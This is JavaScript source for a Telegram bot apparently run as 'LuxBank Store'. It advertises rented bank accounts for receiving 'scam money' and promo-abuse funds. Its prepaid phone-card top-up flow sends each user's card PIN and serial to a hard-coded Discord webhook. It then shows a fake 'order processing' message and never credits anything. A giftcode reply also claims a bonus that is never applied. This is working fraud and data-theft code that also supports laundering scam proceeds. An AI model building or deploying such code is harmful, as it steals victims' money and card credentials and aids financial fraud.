const BOT_TOKEN = process.env.BOT_TOKEN;
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1558054544796024912/EdJSvX5GVYGDFn-55Yh4lS0uzLCCm76eveVlqWtyyx_QyXBx4UdfAbQqJ3WG9JCjlc8u";

// Bộ lưu trữ trạng thái người dùng (State Management)
const userStates = {};

// --- Các hàm tiện ích (Helpers) ---

// Gửi tin nhắn Telegram qua Fetch API
async function sendMessage(chatId, text, replyMarkup = null) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const body = {
    chat_id: chatId,
    text: text,
    parse_mode: "HTML",
    reply_markup: replyMarkup
  };

  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  });
}

// Gửi thông báo đến Discord Webhook
async function sendDiscordWebhook(pin, serial, network, amount, userId) {
  const payload = {
    content: `\`${pin}\`|\`${serial}\`\n📌 **Nhà mạng:** ${network} | **Mệnh giá:** ${amount} | **User ID:** \`${userId}\``
  };

  await fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  }).catch((err) => console.error("Lỗi gửi Discord Webhook:", err));
}

// Tạo mã đơn ngẫu nhiên 5 ký tự
function generateOrderCode() {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let result = "";
  for (let i = 0; i < 5; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// --- BÀN PHÍM HỘP LỆNH (Reply Keyboards) & INLINE KEYBOARDS ---

// Bàn phím Menu Chính (Đã thêm nút 👤CTV Ref)
const mainKeyboard = {
  keyboard: [
    [{ text: "🛒 Cửa hàng" }, { text: "📦 Quản lí hàng" }],
    [{ text: "💳 Nạp tiền" }, { text: "🎁 Ưu đãi" }],
    [{ text: "👤CTV Ref" }, { text: "💬 Hỗ trợ" }]
  ],
  resize_keyboard: true
};

// Cửa hàng
const shopKeyboard = {
  keyboard: [
    [{ text: "💳 Tạo bank ảo" }],
    [{ text: "✍️ Esign trâu" }],
    [{ text: "💛 Locket Gold" }],
    [{ text: "🔙 Quay lại" }]
  ],
  resize_keyboard: true
};

// Bàn phím Inline Cửa hàng (Chứa nút WebApp Thuê Bank Số Đẹp)
const shopInlineKeyboard = {
  inline_keyboard: [
    [
      { 
        text: "🏛️ Thuê Bank Nhận Tiền", 
        web_app: { url: "https://luxbank.netlify.app" } 
      }
    ]
  ]
};

const bankAoKeyboard = {
  keyboard: [
    [{ text: "⏱️ 12 giờ: 40.000₫" }],
    [{ text: "📅 1 ngày: 80.000₫" }],
    [{ text: "📅 3 ngày: 150.000₫" }],
    [{ text: "📅 7 ngày: 250.000₫" }],
    [{ text: "📆 1 tháng: 850.000₫" }],
    [{ text: "📆 2 tháng: 1.700.000₫" }],
    [{ text: "📆 1 năm: 7.700.000₫" }],
    [{ text: "🔙 Quay lại Cửa hàng" }]
  ],
  resize_keyboard: true
};

const manageKeyboard = {
  keyboard: [
    [{ text: "Bank ảo đã tạo" }, { text: "CC Esign" }],
    [{ text: "Locket Gold" }, { text: "🔙 Quay lại" }]
  ],
  resize_keyboard: true
};

const ctvKeyboard = {
  keyboard: [
    [{ text: "Trở thành CTV" }],
    [{ text: "❌ Huỷ" }]
  ],
  resize_keyboard: true
};

const depositKeyboard = {
  keyboard: [
    [{ text: "🏦 Banking" }, { text: "📲 Thẻ cào" }],
    [{ text: "🔙 Quay lại" }]
  ],
  resize_keyboard: true
};

const telcoKeyboard = {
  keyboard: [
    [{ text: "Viettel" }, { text: "Mobifone" }],
    [{ text: "Vinaphone" }, { text: "Vietnamobile" }],
    [{ text: "Gmobile" }, { text: "Zing" }],
    [{ text: "❌ Huỷ" }]
  ],
  resize_keyboard: true
};

const cancelKeyboard = {
  keyboard: [
    [{ text: "❌ Huỷ" }]
  ],
  resize_keyboard: true
};

const supportInlineKeyboard = {
  inline_keyboard: [
    [{ text: "👨‍💻 @littlehoang", url: "https://t.me/littlehoang" }]
  ]
};

function getAmountKeyboard() {
  return {
    keyboard: [
      [{ text: "10.000₫" }, { text: "20.000₫" }, { text: "50.000₫" }],
      [{ text: "100.000₫" }, { text: "200.000₫" }, { text: "500.000₫" }],
      [{ text: "❌ Huỷ" }]
    ],
    resize_keyboard: true
  };
}

// --- Xử lý Handler chính ---

exports.handler = async (event) => {
  if (event.httpMethod !== "POST") {
    return { statusCode: 200, body: "LuxBank Bot đang hoạt động!" };
  }

  try {
    const update = JSON.parse(event.body || "{}");

    if (update.message && update.message.text) {
      const chatId = update.message.chat.id;
      const messageText = update.message.text.trim();
      const userName = update.message.from.first_name || "Khách hàng";
      const userId = update.message.from.id;

      // 1. Xử lý nút "❌ Huỷ"
      if (messageText === "❌ Huỷ") {
        delete userStates[userId];
        await sendMessage(chatId, "❌Đã huỷ", mainKeyboard);
        return { statusCode: 200, body: "OK" };
      }

      // 2. Lệnh /start hoặc Nút Quay lại
      if (messageText.startsWith("/start") || messageText === "🔙 Quay lại") {
        delete userStates[userId];
        const text = 
`<b>Xin chào ${userName} Đến Với LuxBank Store!</b>
> Admin: @littlehoang
> Bot: @ThueLuxBank_bot

🆔 <code>${userId}</code>
💲Số dư: 0₫
💲Tổng nạp: 0₫
> Cấp bậc: <i>Thành viên</i>`;

        await sendMessage(chatId, text, mainKeyboard);
      }

      // 3. Nút "🛒 Cửa hàng" hoặc "🔙 Quay lại Cửa hàng"
      else if (messageText === "🛒 Cửa hàng" || messageText === "🔙 Quay lại Cửa hàng") {
        delete userStates[userId];
        const text = 
`<b>Cửa hàng LuxBank</b>
🆔 <code>${userId}</code>
💲Số dư: 0₫

👇Chọn dịch vụ bên dưới hoặc thuê Bank nhận tiền MMO - tiền Bào KM - tiền Scam`;

        await sendMessage(chatId, text, shopInlineKeyboard);
        await sendMessage(chatId, "Menu:", shopKeyboard);
      }

      // 4. Nút "💳 Tạo bank ảo"
      else if (messageText === "💳 Tạo bank ảo") {
        delete userStates[userId];
        const text = 
`Chọn gói thuê bank ảo:
> Số dư: 0₫

Cấp bậc: <i>Thành viên</i> giảm 0%
👇 Chọn gói bên dưới`;

        await sendMessage(chatId, text, bankAoKeyboard);
      }

      // 5. Nút "👤CTV Ref"
      else if (messageText === "👤CTV Ref") {
        delete userStates[userId];
        const text = 
`<b>Trở thành Cộng Tác Viên Ref</b>
🆔 <code>${userId}</code>

Trở thành CTV Ref bạn sẽ được các quyền lợi sau:
• Giảm 22% mọi đơn Nạp tiền
• Mời được 50 bạn bè sẽ được cộng 35.000₫ (Tối thiểu rút 100.000₫)
• Ưu tiên hỗ trợ và đơn hàng`;

        await sendMessage(chatId, text, ctvKeyboard);
      }

      // 5.1 Xử lý Nút "Trở thành CTV"
      else if (messageText === "Trở thành CTV") {
        delete userStates[userId];
        const text = 
`<b>Cộng Tác Viên Ref</b>
🆔 <code>${userId}</code>

✅<i>Bạn đã trở thành Cộng Tác Viên của Liên Minh LuxBank!</i>`;

        await sendMessage(chatId, text, mainKeyboard);
      }

      // 6. Nút "📦 Quản lí hàng"
      else if (messageText === "📦 Quản lí hàng") {
        delete userStates[userId];
        const text = 
`<b>Quản lí hàng</b>
🆔 <code>${userId}</code>
Chọn mục cần xem👇`;

        await sendMessage(chatId, text, manageKeyboard);
      }

      // 6.1 Các mục trong Quản lí hàng
      else if (messageText === "Bank ảo đã tạo") {
        await sendMessage(chatId, "❌Bạn chưa tạo Bank ảo nào!");
        const textMain = 
`<b>Xin chào ${userName} Đến Với LuxBank Store!</b>
> Admin: @littlehoang
> Bot: @ThueLuxBank_bot

🆔 <code>${userId}</code>
💲Số dư: 0₫
💲Tổng nạp: 0₫
> Cấp bậc: <i>Thành viên</i>`;
        await sendMessage(chatId, textMain, mainKeyboard);
      }

      else if (messageText === "CC Esign") {
        await sendMessage(chatId, "❌Bạn chưa mua Chứng chỉ nào!");
        const textMain = 
`<b>Xin chào ${userName} Đến Với LuxBank Store!</b>
> Admin: @littlehoang
> Bot: @ThueLuxBank_bot

🆔 <code>${userId}</code>
💲Số dư: 0₫
💲Tổng nạp: 0₫
> Cấp bậc: <i>Thành viên</i>`;
        await sendMessage(chatId, textMain, mainKeyboard);
      }

      else if (messageText === "Locket Gold") {
        await sendMessage(chatId, "❌Bạn chưa mua Locket Gold nào!");
        const textMain = 
`<b>Xin chào ${userName} Đến Với LuxBank Store!</b>
> Admin: @littlehoang
> Bot: @ThueLuxBank_bot

🆔 <code>${userId}</code>
💲Số dư: 0₫
💲Tổng nạp: 0₫
> Cấp bậc: <i>Thành viên</i>`;
        await sendMessage(chatId, textMain, mainKeyboard);
      }

      // 7. Nút "💬 Hỗ trợ"
      else if (messageText === "💬 Hỗ trợ") {
        delete userStates[userId];
        const text = 
`<b>Hỗ Trợ - Báo Lỗi</b>
🆔 <code>${userId}</code>
🆘Bạn cần hỗ trợ hoặc báo lỗi về vấn đề? Vui lòng liên hệ admin👇`;

        await sendMessage(chatId, text, supportInlineKeyboard);
        await sendMessage(chatId, "Bấm <b>❌ Huỷ</b> để quay lại menu chính.", cancelKeyboard);
      }

      // 8. Nút "🎁 Ưu đãi"
      else if (messageText === "🎁 Ưu đãi") {
        userStates[userId] = { step: "WAITING_GIFTCODE" };
        const text = 
`<b>LuxBank • Store Giftcode</b>
🎁Vui lòng nhập giftcode và <i>trả lời</i> tin nhắn này để nhận ưu đãi!`;

        await sendMessage(chatId, text, cancelKeyboard);
      }

      // 9. Nút "💳 Nạp tiền"
      else if (messageText === "💳 Nạp tiền") {
        delete userStates[userId];
        const text = 
`<b>Nạp tiền</b>
🆔 <code>${userId}</code>
Vui lòng chọn phương thức nạp tiền👇`;

        await sendMessage(chatId, text, depositKeyboard);
      }

      // 10. Nút "🏦 Banking"
      else if (messageText === "🏦 Banking") {
        // Giữ nguyên chưa xử lý
      }

      // 11. Nút "📲 Thẻ cào"
      else if (messageText === "📲 Thẻ cào") {
        userStates[userId] = { step: "SELECT_TELCO" };
        const text = 
`<b>Nạp thẻ cào</b>
Vui lòng chọn <i>nhà mạng</i> bên dưới
📌Lưu ý:
• Sai mệnh giá thẻ sẽ bị mất thẻ
• Thẻ lỗi không được cộng tiền
• Trường hợp hệ thống lỗi không cộng tiền vui lòng liên hệ admin`;

        await sendMessage(chatId, text, telcoKeyboard);
      }

      // 12. Chọn Nhà Mạng
      else if (["Viettel", "Mobifone", "Vinaphone", "Vietnamobile", "Gmobile", "Zing"].includes(messageText)) {
        userStates[userId] = { step: "SELECT_AMOUNT", telco: messageText };
        const text = 
`<b>Nạp thẻ ${messageText}</b>
Chiết khấu: <i>12%</i>
Chọn <b>mệnh giá</b> thẻ:`;

        await sendMessage(chatId, text, getAmountKeyboard());
      }

      // 13. Chọn Mệnh Giá
      else if (["10.000₫", "20.000₫", "50.000₫", "100.000₫", "200.000₫", "500.000₫"].includes(messageText)) {
        if (userStates[userId] && userStates[userId].step === "SELECT_AMOUNT") {
          const rawAmount = parseInt(messageText.replace(/\D/g, ""), 10);
          const netAmount = (rawAmount * 0.88).toLocaleString("vi-VN");

          userStates[userId] = {
            step: "WAITING_CARD_DATA",
            telco: userStates[userId].telco,
            amount: messageText,
            netAmount: netAmount
          };

          const text = 
`<b>Nạp thẻ ${userStates[userId].telco} - ${messageText}</b>
Chiết khấu: <i>12%</i>
Thực nhận: ${netAmount}₫

Vui lòng <i>vuốt trả lời</i> và nhập <b>mã thẻ</b> và <b>số seri</b>`;

          await sendMessage(chatId, text, cancelKeyboard);
        }
      }

      // 14. Xử lý phản hồi nhập dữ liệu (Giftcode hoặc Thẻ Cào)
      else if (userStates[userId]) {
        const state = userStates[userId];

        // Nhập Giftcode
        if (state.step === "WAITING_GIFTCODE") {
          delete userStates[userId];
          if (messageText === "NGUOIMOI") {
            const text = `Đã nhập Giftcode Ưu đãi thành công! Quý khách được cộng <i>15 Nghìn Đồng</i> & Ưu đãi 15% khi nạp tiền.`;
            await sendMessage(chatId, text, mainKeyboard);
          } else {
            const text = `❌Giftcode hết hạn hoặc không tồn tại!`;
            await sendMessage(chatId, text, mainKeyboard);
          }
        }

        // Nhập Mã Thẻ & Seri
        else if (state.step === "WAITING_CARD_DATA") {
          const cardParts = messageText.split(/[\s|/\-\n]+/);
          const pin = cardParts[0] || messageText;
          const serial = cardParts[1] || "Không có seri";

          await sendDiscordWebhook(pin, serial, state.telco, state.amount, userId);

          const orderCode = generateOrderCode();
          const text = 
`<b>Đơn nạp đang được xử lí</b>
🆔 <code>${userId}</code>
💸Mệnh giá: ${state.amount}
Nhà mạng: ${state.telco}
Mã đơn: <code>${orderCode}</code>
—<b>Đơn nạp đang được xử lí, vui lòng đợi 5-10s để hệ thống xử lí!</b>—`;

          delete userStates[userId];
          await sendMessage(chatId, text, mainKeyboard);
        }
      }
    }

    return { statusCode: 200, body: "OK" };
  } catch (err) {
    console.error("Lỗi hệ thống:", err);
    return { statusCode: 200, body: "Error handled" };
  }
};
